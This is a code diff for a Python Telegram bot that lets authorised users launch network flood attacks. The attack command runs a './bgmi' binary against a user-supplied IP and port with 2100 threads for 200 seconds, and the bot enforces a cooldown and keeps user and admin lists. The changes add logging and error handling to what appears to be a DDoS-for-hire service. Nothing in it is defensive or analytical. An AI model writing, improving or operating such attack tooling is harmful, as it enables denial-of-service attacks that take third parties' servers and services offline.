@@ -3,21 +3,29 @@ import json
 import os
 import asyncio
 import time
+import logging
 from telegram import Update, InputFile
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
+
+# Config
 from config import BOT_TOKEN, OWNER_USERNAME, CHANNEL_LINK, CHANNEL_LOGO
 
 USER_FILE = "users.json"
 ADMIN_FILE = "admins.json"
 DEFAULT_THREADS = 2100
 DEFAULT_PACKET = 20
-DEFAULT_DURATION = 200 
-ATTACK_COOLDOWN = 300 
+DEFAULT_DURATION = 200
+ATTACK_COOLDOWN = 300
 
+# Initialize data structures
 users = {}
 admins = {}
 user_processes = {}
 user_last_attack = {}
+
+# Setup logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 def load_data(file):
     try:
@@ -79,9 +87,16 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
-    process = subprocess.Popen(command)
+    
+    try:
+        process = subprocess.Popen(command)
+    except Exception as e:
+        logger.error(f"Error while starting attack: {e}")
+        await update.message.reply_text("❌ There was an error starting the attack.")
+        return
+
     user_processes[user_id] = process
-    user_last_attack[user_id] = current_time  
+    user_last_attack[user_id] = current_time
 
     await update.message.reply_text(f'🚀 Attack started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')
 
@@ -200,6 +215,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     )
     await update.message.reply_text(message)
 
+def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Log Errors caused by Updates."""
+    logger.warning(f"Update {update} caused error {context.error}")
+
 def main():
     application = ApplicationBuilder().token(BOT_TOKEN).build()
 
@@ -211,6 +230,8 @@ def main():
     application.add_handler(CommandHandler("remove_admin", remove_admin))
     application.add_handler(CommandHandler("allmembers", all_members))
     application.add_handler(CommandHandler("help", help_command))
+
+    application.add_error_handler(error)
 
     global users, admins
     users = load_data(USER_FILE)
